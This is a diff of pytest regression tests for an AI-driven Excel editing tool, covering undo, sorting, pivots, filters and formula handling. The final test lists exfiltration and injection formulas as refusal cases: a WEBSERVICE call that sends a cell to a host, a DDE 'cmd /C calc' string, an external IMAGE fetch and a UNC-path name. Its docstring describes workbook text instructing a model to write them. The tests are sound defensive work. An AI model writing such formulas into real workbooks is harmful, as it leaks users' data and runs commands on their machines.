@@ -526,7 +526,9 @@ def test_a_file_tool_reads_the_open_workbook_through_a_live_path(book, tmp_path)
     res = asyncio.run(ExcelQueryTool().execute({"path": "live:Live Book.xlsx", "sheet": "Data", "op": "group", "group_by": "Region", "agg": "sum", "column": "Total"}, ctx))
     assert res.ok, res.error
     assert "2,710" in res.output or "2710" in res.output, res.output  # East: 1000*2.5 + 210
-    res = asyncio.run(ExcelReadTool().execute({"path": "live:", "sheet": "Data", "range": "A1:E3"}, ctx))
+    # By its full path, never "the workbook in front": on a PC where the user has
+    # their own Excel open, "in front" is THEIR workbook (the review's rule).
+    res = asyncio.run(ExcelReadTool().execute({"path": "live:" + path, "sheet": "Data", "range": "A1:E3"}, ctx))
     assert res.ok and '["East", "Pens", 1000, 2.5, 2500]' in res.output, res.output  # the unsaved value, calculated
 
 
@@ -550,3 +552,388 @@ def test_a_step_excel_refuses_says_plainly_that_nothing_changed(book, tmp_path):
     out = _apply(path, [{"op": "delete_rows", "sheet": "Data", "at": 2, "count": 2}], tmp_path)
     assert not out["ok"] and out.get("unchanged") and "PivotTable" in out["error"]
     assert _v(wb, "Data", "A2") == "East", "the rows are still there"
+
+
+# ------------------------------------------------------------ the review's pins --
+# Each of these was RED on the first cut (the reviewer drove the real Excel).
+
+
+def _fills(ws, rows, col=1):
+    return [int(ws.Cells(r, col).Interior.ColorIndex) for r in rows]
+
+
+def test_undo_keeps_text_that_looks_like_a_number_or_a_date(book, tmp_path):
+    """An account number kept as text ("00123") came back from Undo as the
+    number 123, and "1/2" as a date."""
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    ws.Range("G2").Formula = "'00123"
+    ws.Range("G3").Formula = "'1/2"
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "G2:G3", "value": "x"}], tmp_path)
+    assert out["ok"], out
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and not back["left"], back
+    assert _v(wb, "Data", "G2") == "00123" and _v(wb, "Data", "G3") == "1/2"
+    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "G1:G3", "by": "G", "header": False}], tmp_path)
+    assert out["ok"], out
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and _v(wb, "Data", "G2") == "00123" and _v(wb, "Data", "G3") == "1/2"
+
+
+def test_undo_puts_back_the_number_format_excel_changed_by_itself(book, tmp_path):
+    """Writing "2026-01-31" or "50%" makes Excel change the cell's format; Undo
+    put the 5 back and left it showing as 1/5/1900 (or 500%)."""
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    ws.Range("I2:I3").Value = 5
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "I2", "value": "2026-01-31"},
+                        {"op": "set", "sheet": "Data", "cell": "I3", "value": "50%"}], tmp_path)
+    assert out["ok"] and ws.Range("I2").NumberFormat != "General"
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and not back["left"], back
+    assert ws.Range("I2").NumberFormat == "General" and ws.Range("I3").NumberFormat == "General"
+    assert ws.Range("I2").Text == "5" and ws.Range("I3").Text == "5"
+
+
+def test_sort_undo_puts_colours_and_notes_back_with_their_rows(book, tmp_path):
+    """A sort moves a row's fill and its note with the row; Undo moved the
+    values back and left the yellow row and the note on another client's row."""
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    ws.Range("A2:E2").Interior.Color = 65535
+    ws.Range("A2").AddComment("about East Pens")
+    before = _fills(ws, range(2, 7))
+    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "A1:E6", "by": [{"column": "Qty", "order": "asc"}]}], tmp_path)
+    assert out["ok"] and _fills(ws, range(2, 7)) != before, "the sort moved the fill"
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and not back["left"], back
+    assert _v(wb, "Data", "B2") == "Pens" and _fills(ws, range(2, 7)) == before
+    assert ws.Range("A2").Comment is not None and ws.Range("A2").Comment.Text() == "about East Pens"
+    assert all(ws.Cells(r, 1).Comment is None for r in range(3, 7))
+
+
+def test_a_sort_that_leaves_out_the_columns_beside_it_is_refused(book, tmp_path):
+    """Sorting A:C of a five-column ledger moved three columns and left the
+    prices and totals where they were: every row mixed up, with no warning
+    (Excel's own window asks "expand the selection?")."""
+    wb, path = book
+    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "A1:C6", "by": "Qty"}], tmp_path)
+    assert not out["ok"] and out["code"] == "partial_sort" and "D" in out["error"] and "alone" in out["error"], out
+    assert [_v(wb, "Data", f"C{r}") for r in range(2, 7)] == [10, 4, 7, 2, 1]
+    out = _apply(path, [{"op": "sort", "sheet": "Data", "range": "A1:C6", "by": "Qty", "alone": True}], tmp_path)
+    assert out["ok"], "said outright, a part of the table can be sorted by itself"
+
+
+def test_a_refused_pivot_never_clears_a_pivot_table_that_was_already_there(book, tmp_path):
+    """A second pivot under a name already used on that sheet is refused by
+    Excel; putting the step "back" cleared EVERY pivot table on the sheet,
+    the user's own included, and then said nothing was changed."""
+    wb, path = book
+    made = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Region"], "values": ["Qty"], "dest_sheet": "Notes", "dest_cell": "A3", "name": "Mine"}], tmp_path)
+    assert made["ok"], made
+    notes = wb.Worksheets("Notes")
+    out = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Item"], "values": ["Qty"], "dest_sheet": "Notes", "dest_cell": "T3", "name": "Mine"}], tmp_path)
+    assert not out["ok"], out
+    assert [p.Name for p in notes.PivotTables()] == ["Mine"] and notes.Range("A4").Value == "East"
+    # ...and one Excel refuses AFTER it made the new pivot table (a value named
+    # like a column): only the new one is taken away again.
+    out = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Item"], "values": [{"field": "Qty", "caption": "Qty"}],
+                        "dest_sheet": "Notes", "dest_cell": "T3"}], tmp_path)
+    assert not out["ok"] and out.get("unchanged"), out
+    assert [p.Name for p in notes.PivotTables()] == ["Mine"] and notes.Range("A4").Value == "East"
+    assert notes.Range("T3").Value is None
+
+
+def test_a_sheet_excel_will_not_name_is_not_left_behind(book, tmp_path):
+    """"History" is a name Excel keeps for itself: the sheet was added, the
+    naming refused, and "nothing was changed" left a stray Sheet3."""
+    wb, path = book
+    out = _apply(path, [{"op": "add_sheet", "name": "History"}], tmp_path)
+    assert not out["ok"] and out.get("unchanged"), out
+    assert [s.Name for s in wb.Worksheets] == ["Data", "Notes"]
+    out = _apply(path, [{"op": "pivot", "source": "Data!A1:E6", "rows": ["Region"], "values": ["Qty"], "dest_sheet": "History"}], tmp_path)
+    assert not out["ok"] and [s.Name for s in wb.Worksheets] == ["Data", "Notes"], out
+
+
+def test_the_selection_read_is_the_named_workbooks_own(excel, book, tmp_path):
+    """look {workbook: A, range: "selection"} while B is in front returned B's
+    cells under A's name (and past the check of A's folder)."""
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    wb.Activate()
+    ws.Activate()
+    ws.Range("B2:C3").Select()
+    other = excel.Workbooks.Add()
+    try:
+        other.Worksheets(1).Name = "Other"
+        other.Worksheets(1).Range("A1:B2").Value = "not yours"
+        other.SaveAs(str(tmp_path / "Other Book.xlsx"))
+        other.Activate()
+        other.Worksheets(1).Range("A1:B2").Select()
+        out = ask({"op": "look", "workbook": path, "range": "selection"})
+        assert out["ok"], out.get("error")
+        rng = out["range"]
+        assert rng["sheet"] == "Data" and rng["address"] == "B2:C3" and rng["rows"] == [["Pens", 10], ["Paper", 4]]
+    finally:
+        other.Close(False)
+
+
+def test_undo_gives_back_the_dropdowns_that_only_some_cells_had(book, tmp_path):
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    ws.Range("B2:B3").Validation.Add(3, 1, 1, "Pens,Paper,Ink")
+    out = _apply(path, [{"op": "validation", "sheet": "Data", "range": "B2:B6", "list": ["a", "b"]}], tmp_path)
+    assert out["ok"] and ws.Range("B2").Validation.Formula1 == "a,b"
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and not back["left"], back
+    assert ws.Range("B2").Validation.Formula1 == "Pens,Paper,Ink" and ws.Range("B3").Validation.Formula1 == "Pens,Paper,Ink"
+    with pytest.raises(Exception):
+        ws.Range("B5").Validation.Type  # noqa: B018
+
+
+def test_undoing_a_table_takes_its_look_away_too(book, tmp_path):
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    out = _apply(path, [{"op": "table", "sheet": "Data", "range": "A1:E6"}], tmp_path)
+    assert out["ok"], out
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and ws.ListObjects.Count == 0
+    assert ws.Range("A1").Interior.ColorIndex == -4142 and ws.Range("A1").Font.Bold is False
+    assert ws.Range("A3").Interior.ColorIndex == -4142
+
+
+def test_a_formula_that_spills_is_written_and_put_back_as_one(book, tmp_path):
+    """Written through the older property, =UNIQUE(...) became =@UNIQUE(...)
+    (one value), and Undo turned a spilled formula into #VALUE!."""
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "I1", "formula": "=UNIQUE(A2:A6)"}], tmp_path)
+    assert out["ok"], out
+    assert [ws.Cells(r, 9).Value for r in (1, 2, 3)] == ["East", "West", "North"]
+    ws.Range("G1").Formula2 = "=C2:C6*2"
+    assert ws.Range("G3").Value == 14
+    out = _apply(path, [{"op": "clear", "sheet": "Data", "range": "G1:G5"}], tmp_path)
+    assert out["ok"] and ws.Range("G3").Value is None
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and not back["left"], back
+    assert ws.Range("G1").Formula2 == "=C2:C6*2" and [ws.Cells(r, 7).Value for r in range(1, 6)] == [20, 8, 14, 4, 2]
+
+
+def test_an_array_formula_over_several_cells_comes_back_as_one_array(book, tmp_path):
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    ws.Range("G2:G6").FormulaArray = "=C2:C6*D2:D6"
+    out = _apply(path, [{"op": "clear", "sheet": "Data", "range": "G2:G6"}], tmp_path)
+    assert out["ok"], out
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and not back["left"], back
+    assert ws.Range("G2").HasArray is True and ws.Range("G2").CurrentArray.Address == "$G$2:$G$6"
+    assert [ws.Cells(r, 7).Value for r in range(2, 7)] == [25, 48, 210, 5, 30]
+
+
+def test_a_write_excel_silently_drops_is_said(book, tmp_path):
+    """A value written to the second cell of a merged pair goes nowhere, and
+    the answer still said "Changed"."""
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    ws.Range("G1:H1").Merge()
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "H1", "value": 99}], tmp_path)
+    assert out["ok"] and out["changed_cells"] == 0
+    assert "merged" in out["steps"][0].get("warning", ""), out["steps"]
+
+
+def test_undoing_a_removed_filter_says_the_filter_is_not_back(book, tmp_path):
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    out = _apply(path, [{"op": "clear_filter", "sheet": "Data"}], tmp_path)
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and not back["left"], "no filter was on: there is nothing to say"
+    ws.Range("A1:E6").AutoFilter(1, "East")
+    out = _apply(path, [{"op": "clear_filter", "sheet": "Data"}], tmp_path)
+    assert out["ok"] and not ws.AutoFilterMode
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert any("filter" in line for line in back["left"]), back
+
+
+def test_rows_hidden_by_a_filter_are_never_written_across(book, tmp_path):
+    """Excel skips the rows a filter hides when a block is written over them:
+    Undo of a clear put "Pens" where "Ink" had been."""
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    items = ["Pens", "Paper", "Ink", "Pens", "Ink"]
+    ws.Range("A1:E6").AutoFilter(1, "East")
+    for step in ({"op": "set", "sheet": "Data", "cell": "B2:B6", "values": [["a"], ["b"], ["c"], ["d"], ["e"]]},
+                 {"op": "clear", "sheet": "Data", "range": "B2:B6"},
+                 {"op": "sort", "sheet": "Data", "range": "A1:E6", "by": "Qty"}):
+        out = _apply(path, [step], tmp_path)
+        assert not out["ok"] and out["code"] == "filtered" and "filter" in out["error"], out
+    ws.AutoFilterMode = False
+    assert [_v(wb, "Data", f"B{r}") for r in range(2, 7)] == items
+    out = _apply(path, [{"op": "clear", "sheet": "Data", "range": "B2:B6"}], tmp_path)
+    assert out["ok"], out
+    ws.Range("A1:E6").AutoFilter(1, "East")  # the user filters afterwards
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert any("filter" in line for line in back.get("left") or [back.get("error", "")]), back
+    ws.AutoFilterMode = False
+    assert [_v(wb, "Data", f"B{r}") for r in range(2, 7)] == [None] * 5, "nothing was written across the hidden rows"
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and [_v(wb, "Data", f"B{r}") for r in range(2, 7)] == items
+
+
+def test_a_formula_a_table_fills_down_by_itself_is_listed_and_undone(book, tmp_path):
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    ws.Range("E2:E6").ClearContents()
+    ws.ListObjects.Add(1, ws.Range("A1:E6"), None, 1)
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "E2", "formula": "=C2*D2"}], tmp_path)
+    assert out["ok"] and _f(wb, "Data", "E6") == "=C6*D6", "Excel filled the table's column"
+    assert out["changed_cells"] == 5 and {c["cell"] for c in out["changes"]} == {"E2", "E3", "E4", "E5", "E6"}
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and [x[0] for x in _f(wb, "Data", "E2:E6")] == [""] * 5
+
+
+def test_undo_never_reaches_past_a_deletion_into_rows_that_have_moved(book, tmp_path):
+    """[set B6, delete row 2] then Undo wrote B6's old value into what is NOW
+    row 6: another client's row."""
+    wb, path = book
+    ws = wb.Worksheets("Notes")
+    ws.Range("A1:B8").Value = (("Client", "Status"), ("A", "open"), ("B", "open"), ("C", "open"), ("D", "open"), ("E", "open"), ("F", "paid"), ("G", "open"))
+    out = _apply(path, [{"op": "set", "sheet": "Notes", "cell": "B6", "value": "paid"},
+                        {"op": "delete_rows", "sheet": "Notes", "at": 2, "count": 1}], tmp_path, copy_path=str(tmp_path / "c.xlsx"))
+    assert out["ok"], out
+    after = [list(r) for r in ws.Range("A1:B7").Value]
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert [list(r) for r in ws.Range("A1:B7").Value] == after, "F's row was never part of the change"
+    assert any("cannot be put back" in line for line in back["left"]) and any("before" in line for line in back["left"])
+
+
+def test_undo_never_lands_on_another_workbook_of_the_same_name(excel, tmp_path):
+    a_dir, b_dir = tmp_path / "a", tmp_path / "b"
+    a_dir.mkdir()
+    b_dir.mkdir()
+    wb = excel.Workbooks.Add()
+    wb.Worksheets(1).Name = "Data"
+    wb.Worksheets(1).Range("A1:B5").Value = (("h1", "h2"), ("x", 1), ("y", 2), ("z", 3), ("w", 4))
+    wb.SaveAs(str(a_dir / "Same.xlsx"))
+    out = _apply(str(a_dir / "Same.xlsx"), [{"op": "insert_rows", "sheet": "Data", "at": 3, "count": 2},
+                                           {"op": "clear", "sheet": "Data", "range": "A1"}], tmp_path)
+    assert out["ok"], out
+    wb.Close(False)
+    wb2 = excel.Workbooks.Add()
+    try:
+        ws2 = wb2.Worksheets(1)
+        ws2.Name = "Data"
+        ws2.Range("A2:B5").Value = (("x", 1), ("", ""), ("", ""), ("y", 2))
+        wb2.SaveAs(str(b_dir / "Same.xlsx"))
+        before = [list(r) for r in ws2.Range("A1:B5").Value]
+        back = ask({"op": "restore", "undo_path": out["_undo"]})
+        assert not back["ok"], back
+        assert [list(r) for r in ws2.Range("A1:B5").Value] == before
+    finally:
+        wb2.Close(False)
+
+
+def test_a_reading_copy_of_a_csv_keeps_its_own_ending(excel, tmp_path):
+    src = tmp_path / "ledger.csv"
+    src.write_text("a,b\n1,2\n", encoding="utf-8")
+    (tmp_path / "snap").mkdir()
+    wb = excel.Workbooks.Open(str(src))
+    try:
+        out = ask({"op": "snapshot", "workbook": str(src), "dir": str(tmp_path / "snap")})
+        assert out["ok"] and Path(out["path"]).name != "ledger.csv.xlsx", out
+        assert Path(out["path"]).suffix.lower() == ".csv" and Path(out["path"]).read_bytes().startswith(b"a,b")
+    finally:
+        wb.Close(False)
+
+
+def test_undo_leaves_a_format_the_user_changed_afterwards(book, tmp_path):
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "A2:A3", "fill": "FFF2CC", "bold": True}], tmp_path)
+    assert out["ok"], out
+    ws.Range("A2").Interior.Color = 255  # the user's own colour, after the change
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and any("format" in line and "since" in line for line in back["left"]), back
+    assert int(ws.Range("A2").Interior.Color) == 255, "the user's colour stays"
+    assert ws.Range("A3").Interior.ColorIndex == -4142 and ws.Range("A2").Font.Bold is False and ws.Range("A3").Font.Bold is False
+
+
+def test_undo_of_a_recolour_gives_each_cell_its_own_colour_back(book, tmp_path):
+    """Over cells of several colours Excel answers "black" for the range's
+    colour: Undo of a new fill painted every one of them black."""
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    ws.Range("A2").Interior.Color = 255
+    ws.Range("A3").Interior.Color = 65280
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "A2:A4", "fill": "FFF2CC"}], tmp_path)
+    assert out["ok"], out
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and not back["left"], back
+    assert [int(ws.Range(c).Interior.Color) for c in ("A2", "A3")] == [255, 65280]
+    assert ws.Range("A4").Interior.ColorIndex == -4142
+
+
+def test_a_step_refused_on_a_protected_sheet_is_not_called_half_done(book, tmp_path):
+    """The first step WAS put back and the second never happened, yet the
+    answer said the change "could not all be put back"."""
+    wb, path = book
+    wb.Worksheets("Notes").Protect()
+    for second in ({"op": "set", "sheet": "Notes", "cell": "A1", "value": "x"},
+                   {"op": "set", "sheet": "Notes", "cell": "A1", "bold": True}):
+        out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "A2", "value": "changed"}, second], tmp_path)
+        assert not out["ok"] and out.get("unchanged") and not out.get("partly"), out
+        assert "Excel refused" in out["error"] and _v(wb, "Data", "A2") == "East"
+
+
+def test_a_text_contains_colour_rule_can_be_added(book, tmp_path):
+    wb, path = book
+    ws = wb.Worksheets("Data")
+    out = _apply(path, [{"op": "conditional_format", "sheet": "Data", "range": "B2:B6", "rule": "text_contains", "value": "Pen", "fill": "C6EFCE"}], tmp_path)
+    assert out["ok"], out
+    assert ws.Range("B2:B6").FormatConditions.Count == 1
+    green = 0xC6 + 0xEF * 256 + 0xCE * 65536
+    assert ws.Range("B2").DisplayFormat.Interior.Color == green and ws.Range("B3").DisplayFormat.Interior.Color != green
+    back = ask({"op": "restore", "undo_path": out["_undo"]})
+    assert back["ok"] and ws.Range("B2:B6").FormatConditions.Count == 0
+
+
+def test_a_step_on_a_sheet_renamed_in_the_same_call_is_still_counted(book):
+    """Renaming a sheet first made every later step on it "a new sheet": a
+    deletion there was not seen as one, and overwritten cells were not counted."""
+    wb, path = book
+    out = ask({"op": "plan", "workbook": path, "ops": [{"op": "rename_sheet", "sheet": "Data", "to": "Ledger"},
+                                                       {"op": "delete_rows", "sheet": "Ledger", "at": 2, "count": 3}]})
+    assert out["ok"] and out["destructive"], out
+    out = ask({"op": "plan", "workbook": path, "ops": [{"op": "rename_sheet", "sheet": "Data", "to": "Ledger"},
+                                                       {"op": "set", "sheet": "Ledger", "cell": "E2:E6", "value": 0}]})
+    assert out["ok"] and out["overwrites"] == 5 and out["formulas_lost"] == 5, out
+
+
+def test_fixing_one_of_many_errors_is_not_reported_as_a_new_error(book, tmp_path):
+    """Only the first 40 error cells of a sheet were read: fix one of fifty
+    and the 41st old one was announced as an error the change had made."""
+    wb, path = book
+    wb.Worksheets("Data").Range("G1:G50").Formula = "=1/0"
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "G1", "value": 1}], tmp_path)
+    assert out["ok"] and out["new_errors"] == [], out["new_errors"]
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "H1", "formula": "=1/0"}], tmp_path)
+    assert out["new_errors"] == ["Data!H1"], "a real new error is still said"
+
+
+def test_a_formula_that_would_send_cells_outside_is_never_written(book, tmp_path):
+    """A workbook's own text can tell a model to write =WEBSERVICE(...&A1):
+    Excel itself would then send the cell out. (Refused in the check, so
+    nothing here reaches any address.)"""
+    wb, path = book
+    for step in (
+        {"op": "set", "sheet": "Data", "cell": "G1", "formula": '=WEBSERVICE("http://127.0.0.1:9/?d="&A2)'},
+        {"op": "set", "sheet": "Data", "cell": "G1", "value": "=cmd|' /C calc'!A0"},
+        {"op": "set", "sheet": "Data", "cell": "G1", "values": [["x", '=IMAGE("https://example.com/a.png")']]},
+        {"op": "name", "name": "Outside", "refers_to": "='\\\\host\\share\\[b.xlsx]S'!A1"},
+        {"op": "conditional_format", "sheet": "Data", "range": "A2:A6", "rule": "formula", "formula": '=LEN(WEBSERVICE("http://127.0.0.1:9"))>0'},
+    ):
+        out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "F1", "value": "first"}, step], tmp_path)
+        assert not out["ok"] and out["code"] == "reaches_out" and "type it in Excel" in out["error"], out
+    assert _v(wb, "Data", "G1") is None and _v(wb, "Data", "F1") is None and all(n.Name != "Outside" for n in wb.Names)
+    out = _apply(path, [{"op": "set", "sheet": "Data", "cell": "G1", "formula": '=HYPERLINK("https://example.com","site")'}], tmp_path)
+    assert out["ok"] and _v(wb, "Data", "G1") == "site", "a link the user has to click is an ordinary formula"
